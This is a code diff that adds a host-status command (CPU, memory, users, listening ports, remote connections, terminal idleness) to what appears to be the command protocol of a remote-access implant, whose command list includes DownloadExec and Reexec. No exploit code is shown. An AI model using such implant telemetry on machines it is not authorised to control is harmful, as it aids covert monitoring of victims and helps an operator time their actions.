@@ -15,6 +15,7 @@ import urlparse
 import StringIO
 import socket
 import psutil
+import os
 
 def from_bytes(bytes):
     return sum(ord(byte) * (256**i) for i, byte in enumerate(bytes))
@@ -45,6 +46,103 @@ class Poll(Command):
 
     def __repr__(self):
         return '{POLL}'
+
+class SystemStatus(Command):
+    @staticmethod
+    def unpack(data):
+        return SystemStatus(*struct.unpack_from('BBBBBB', data)), 6
+
+    def __init__(self, cpu=None, users=None, mem=None, listen=None, remote=None, idle=None):
+        if cpu is None:
+            try:
+                self.cpu = int(psutil.cpu_percent())
+            except:
+                self.cpu = 0
+        else:
+            self.cpu = int(cpu)
+
+        if users is None:
+            try:
+                self.users = len(set([ x.name for x in psutil.users()]))
+            except:
+                self.users = 0
+        else:
+            self.users = int(users)
+
+        if self.users > 255:
+            self.users = 255
+
+        if mem is None:
+            try:
+                self.mem = int(psutil.virtual_memory().percent)
+            except:
+                self.mem = 0
+        else:
+            self.mem = int(mem)
+
+        if listen is None:
+            try:
+                self.listen = len(set([
+                    x.laddr[1] for x in psutil.net_connections() if x.status=='LISTEN'
+                ]))
+            except:
+                self.listen = 0
+        else:
+            self.listen = int(listen)
+
+        if self.listen > 255:
+            self.listen = 255
+
+        if remote is None:
+            try:
+                self.remote = len(set([
+                    x.raddr for x in psutil.net_connections() \
+                    if x.status=='ESTABLISHED' and x.raddr[0] not in (
+                        '127.0.0.1', '::ffff:127.0.0.1'
+                    )
+                ]))
+
+            except Exception, e:
+                self.remote = 0
+        else:
+            self.remote = int(remote)
+
+        if self.remote > 255:
+            self.remote = 255
+
+        if idle is None:
+            try:
+                self.idle = min(
+                    time.time() - os.stat(
+                        '/dev/{}'.format(x.terminal)
+                    ).st_atime for x in psutil.users() if x.terminal
+                ) > 60*10
+            except:
+                self.idle = True
+        else:
+            self.idle = bool(idle)
+
+    def get_dict(self):
+        return {
+            'cpu': self.cpu,
+            'mem': self.mem,
+            'listen': self.listen,
+            'remote': self.remote,
+            'users': self.users,
+            'idle': self.idle
+        }
+
+    def pack(self):
+        return struct.pack(
+            'BBBBBB',
+            self.cpu, self.users, self.mem,
+            self.listen, self.remote, self.idle
+        )
+
+    def __repr__(self):
+        return ('{{SS: CPU:{cpu}% MEM:{mem}% L:{listen} ' + \
+                    'E:{remote} U:{users} I:{idle}}}').format(**self.get_dict())
+
 
 class Ack(Command):
     def __init__(self, amount=0):
@@ -590,7 +688,7 @@ class Parcel(object):
     commands = [
         Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
-        Sleep, Reexec, DownloadExec, CheckConnect
+        Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus
     ]
 
     commands_decode = dict(enumerate(commands))
